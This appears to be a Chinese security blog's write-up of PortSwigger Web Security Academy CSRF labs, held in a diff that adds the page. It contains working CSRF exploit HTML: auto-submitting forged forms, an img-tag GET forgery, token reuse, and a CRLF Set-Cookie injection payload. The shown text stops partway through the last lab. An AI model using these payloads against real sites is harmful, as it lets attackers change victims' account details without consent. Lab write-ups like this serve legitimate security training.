@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的跨站请求伪造（CSRF，Cross-site req">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy CSRF 跨站请求伪造">
+<meta property="og:url" content="https://secdroid.github.io/2025/02/12/burp-web-academy-csrf-cross-site-request-forgery/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的跨站请求伪造（CSRF，Cross-site req">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-02-12T13:32:33.503Z">
+<meta property="article:modified_time" content="2025-02-12T13:30:56.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="Burp">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="Cookie">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/02/12/burp-web-academy-csrf-cross-site-request-forgery/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/02/12/burp-web-academy-csrf-cross-site-request-forgery/","path":"2025/02/12/burp-web-academy-csrf-cross-site-request-forgery/","title":"Burp Web Academy CSRF 跨站请求伪造"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy CSRF 跨站请求伪造 | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-CSRF"><span class="nav-number">2.</span> <span class="nav-text">0x02. CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-CSRF-vulnerability-with-no-defenses"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: CSRF vulnerability with no defenses</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-CSRF-where-token-validation-depends-on-request-method"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: CSRF where token validation depends on request method</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-CSRF-where-token-validation-depends-on-token-being-present"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: CSRF where token validation depends on token being present</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Lab-CSRF-where-token-is-not-tied-to-user-session"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 Lab: CSRF where token is not tied to user session</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Lab-CSRF-where-token-is-tied-to-non-session-cookie"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 Lab: CSRF where token is tied to non-session cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-Lab-CSRF-where-token-is-duplicated-in-cookie"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 Lab: CSRF where token is duplicated in cookie</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Cookie-%E5%B1%9E%E6%80%A7"><span class="nav-number">3.</span> <span class="nav-text">0x03. Cookie 属性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%B0%8F%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">0x04. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">5.</span> <span class="nav-text">0x05. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/02/12/burp-web-academy-csrf-cross-site-request-forgery/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy CSRF 跨站请求伪造 | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy CSRF 跨站请求伪造
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-02-12 21:32:33 / 修改时间：21:30:56" itemprop="dateCreated datePublished" datetime="2025-02-12T21:32:33+08:00">2025-02-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的跨站请求伪造（CSRF，Cross-site request forgery）章节。</p>
+<span id="more"></span>
+
+<h2 id="0x02-CSRF"><a href="#0x02-CSRF" class="headerlink" title="0x02. CSRF"></a>0x02. CSRF</h2><h3 id="2-1-Lab-CSRF-vulnerability-with-no-defenses"><a href="#2-1-Lab-CSRF-vulnerability-with-no-defenses" class="headerlink" title="2.1 Lab: CSRF vulnerability with no defenses"></a>2.1 Lab: CSRF vulnerability with no defenses</h3><blockquote>
+<p>This lab’s email change functionality is vulnerable to CSRF.</p>
+<p>To solve the lab, craft some HTML that uses a CSRF attack to change the viewer’s email address and upload it to your exploit server.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>使用测试账号登录，尝试修改 E-mail，发现只是简单发了一个 POST 请求，没有类似 CSRF Token 之类的保护机制。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/my-account/change-email</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a120044041b586fb06d46f6004400bb.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=A6cFoqevGQw2WjKZYyX1ulcOIdVA4DY8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>28</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">email</span><span class="operator">=</span>test%<span class="number">40</span>normal-user.net</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试在 Exploit Server 构造如下页面发送 POST 请求：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">https://0a120044041b586fb06d46f6004400bb.web-security-academy.net/my-account/change-email</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123@gmail.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意，Hint 提示一个 E-mail 只能绑定给一个用户，而且测试的域名用来做邮箱好像不行。</p>
+<h3 id="2-2-Lab-CSRF-where-token-validation-depends-on-request-method"><a href="#2-2-Lab-CSRF-where-token-validation-depends-on-request-method" class="headerlink" title="2.2 Lab: CSRF where token validation depends on request method"></a>2.2 Lab: CSRF where token validation depends on request method</h3><blockquote>
+<p>This lab’s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.</p>
+<p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>POST 表单多了隐藏的 CSRF Token：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;login-form&quot;</span> <span class="attr">name</span>=<span class="string">&quot;change-email-form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;mn8cn76GTJdnt1rApjW7sq29DLH4yRsL&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span> Update email <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据提示，可能支持 GET 请求更新 E-mail 并且没有保护机制，测试确认确实如此。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/my-account/change-email?email=hello@test.com</span> <span class="meta">HTTP/2</span></span><br></pre></td></tr></table></figure>
+
+<p>直接在 Exploit Server 构造如下 HTML 代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://0a35009e036a3fe281eadaf6000a00a1.web-security-academy.net/my-account/change-email?email=test@gmail.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-Lab-CSRF-where-token-validation-depends-on-token-being-present"><a href="#2-3-Lab-CSRF-where-token-validation-depends-on-token-being-present" class="headerlink" title="2.3 Lab: CSRF where token validation depends on token being present"></a>2.3 Lab: CSRF where token validation depends on token being present</h3><blockquote>
+<p>This lab’s email change functionality is vulnerable to CSRF.</p>
+<p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>POST 表单存在隐藏的 CSRF Token，但如果提交时没有 <code>csrf</code> 字段也能成功，利用方式和第一个相同。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">https://0a0d00a903fab13f80b2588700fd00ba.web-security-academy.net/my-account/change-email</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123@gmail.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-Lab-CSRF-where-token-is-not-tied-to-user-session"><a href="#2-4-Lab-CSRF-where-token-is-not-tied-to-user-session" class="headerlink" title="2.4 Lab: CSRF where token is not tied to user session"></a>2.4 Lab: CSRF where token is not tied to user session</h3><blockquote>
+<p>This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t integrated into the site’s session handling system.</p>
+<p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p>
+<p>You have two accounts on the application that you can use to help design your attack. The credentials are as follows:</p>
+<ul>
+<li><code>wiener:peter</code></li>
+<li><code>carlos:montoya</code></li>
+</ul>
+</blockquote>
+<p>测试发现，CSRF Token 和用户 Session 并没有绑定关系，也就是说，可以使用其他用户的合法 Token 来发起 CSRF 攻击。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">https://0ac300cd04435066804aadda0071004a.web-security-academy.net/my-account/change-email</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;cWxIi36INCmqju75TjUejn0mPv8gu5Vb&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123@gmail.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-Lab-CSRF-where-token-is-tied-to-non-session-cookie"><a href="#2-5-Lab-CSRF-where-token-is-tied-to-non-session-cookie" class="headerlink" title="2.5 Lab: CSRF where token is tied to non-session cookie"></a>2.5 Lab: CSRF where token is tied to non-session cookie</h3><blockquote>
+<p>This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t fully integrated into the site’s session handling system.</p>
+<p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p>
+<p>You have two accounts on the application that you can use to help design your attack. The credentials are as follows:</p>
+<ul>
+<li><code>wiener:peter</code></li>
+<li><code>carlos:montoya</code></li>
+</ul>
+</blockquote>
+<p>测试发现，CSRF Token 是和 Cookie 里面的 <code>csrfKey</code> 绑定的，即 <code>csrfKey</code> 决定了 CSRF Token 是什么。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>csrfKey=rlG9KHbQT5wln8M4Nuz1ZhOQFxDLjfnr; session=8RCz89erDttASpS8kWYHw5zuEkGHie37</span><br></pre></td></tr></table></figure>
+
+<p>但这里涉及到一个问题：如何设置受害者的 Cookie？使用搜索功能，发现关键字出现在了 <code>Set-Cookie</code> 中：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?search=test</span> <span class="meta">HTTP/2</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>LastSearchTerm=test; Secure; HttpOnly</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4541</span><br></pre></td></tr></table></figure>
+
+<p>因此，可以尝试 Cookie 注入，尝试搜索 <code>test; csrfKey=rlG9KHbQT5wln8M4Nuz1ZhOQFxDLjfnr</code>，发现如下代码并不能修改 Cookie：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>LastSearchTerm=test; csrfKey=rlG9KHbQT5wln8M4Nuz1ZhOQFxDLjfnr; Secure; HttpOnly</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3452</span><br></pre></td></tr></table></figure>
+
+<p>查看关于 <code>Set-Cookie</code> 的说明，发现每次只能设置一个 Cookie 字段，如果要设置多个字段，需要多次调用才行：</p>
+<blockquote>
+<p>The HTTP <strong><code>Set-Cookie</code></strong> response header is used to send a cookie from the server to the user agent, so that the user agent can send it back to the server later. To send multiple cookies, multiple <code>Set-Cookie</code> headers should be sent in the same response.</p>
+</blockquote>
+<p>尝试新的注入 Payload（基于回车换行实现）：可以成功修改 Cookie</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?search=test%0d%0aSet-Cookie%3A%20csrfKey%3DrlG9KHbQT5wln8M4Nuz1ZhOQFxDLjfnr%3B</span><br></pre></td></tr></table></figure>
+
+<p>利用代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">https://0a2900e304c8544380424e1d00750061.web-security-academy.net/my-account/change-email</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;aBg6x5G0In7WdYYGUYPMZ3ZK6soCiF7c&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111@gmail.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://0a2900e304c8544380424e1d00750061.web-security-academy.net/?search=test%0d%0aSet-Cookie%3A%20csrfKey%3DrlG9KHbQT5wln8M4Nuz1ZhOQFxDLjfnr%3B&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用 <code>&lt;img&gt;</code> 实现触发 GET 请求，同时利用 <code>onerror</code> 回调实现触发 POST 请求。</p>
+<h3 id="2-6-Lab-CSRF-where-token-is-duplicated-in-cookie"><a href="#2-6-Lab-CSRF-where-token-is-duplicated-in-cookie" class="headerlink" title="2.6 Lab: CSRF where token is duplicated in cookie"></a>2.6 Lab: CSRF where token is duplicated in cookie</h3><blockquote>
+<p>This lab’s email change functionality is vulnerable to CSRF. It attempts to use the insecure “double submit” CSRF prevention technique.</p>
+<p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>CSRF Token 在 Cookie 中保存了一份副本：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>csrf=rebnlY1JEQ1tZjuGmqdWMW8C8TRKDNuP; session=jDe5boZyJSRIYjJad0mwTgfe2yqAmZkF</span><br></pre></td></tr></table></figure>
+
+<p>前面搜索接口改写 Cookie 的漏洞还在：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>LastSearchTerm=test; Secure; HttpOnly</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3975</span><br></pre></td></tr></table></figure>
+
+<p>因此，可以将特定的 CSRF Token 写入 Cookie，然后提交 POST 表单来修改 E-mail 地址。</p>
+<p>利用代码：</p>
